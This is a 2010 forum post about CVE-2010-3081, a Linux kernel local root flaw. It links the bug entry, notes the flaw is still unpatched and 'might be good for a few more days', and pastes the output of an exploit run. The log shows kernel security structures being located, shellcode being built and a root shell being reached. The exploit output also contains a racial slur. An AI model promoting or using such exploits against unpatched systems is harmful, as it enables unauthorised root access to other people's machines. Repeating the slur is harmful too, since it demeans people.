## 64-bit Compatibility Mode Stack Pointer Underflow
Posted by **Automated Penguin** on Fri September 17th, 2010 03:02:24 PM

<!-- m --><a class="postlink" href="https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2010-3081">https://bugzilla.redhat.com/show_bug.cg ... -2010-3081</a><!-- m -->

hasn't been patched yet, might be good for a few more days.

Works on most recent 64 bit builds.

[cbock@eecad1 ~]$ ./hax.out
Ac1dB1tCh3z VS Linux kernel 2.6 kernel 0d4y
$$$ Kallsyms +r	
$$$ K3rn3l r3l3as3: 2.6.18-194.8.1.el5
??? Trying the F0PPPPPPPPPPPPPPPPpppppppppp_____ m3th34d
$$$ L00k1ng f0r kn0wn t4rg3tz.. 
$$$ c0mput3r 1z aqu1r1ng n3w t4rg3t...
$$$ selinux_ops-&gt;ffffffff80327ac0
$$$ dummy_security_ops-&gt;ffffffff804b9540
$$$ capability_ops-&gt;ffffffff80329380
$$$ selinux_enforcing-&gt;ffffffff804bc2a0
$$$ audit_enabled-&gt;ffffffff804a7124
$$$ Bu1ld1ng r1ngzer0c00l sh3llc0d3 - F0PZzzZzZZ/LSD(M) m3th34d
$$$ Prepare: m0rn1ng w0rk0ut b1tch3z
$$$ Us1ng st4nd4rd s3ash3llz
$$$ 0p3n1ng th3 m4giq p0rt4l
$$$ bl1ng bl1ng n1gg4 <!-- s:P --><img src="{SMILIES_PATH}/icon_razz.gif" alt=":P" title="Razz" /><!-- s:P -->ppPpPPpPPPpP
sh-3.2# echo $UID
0

FYI
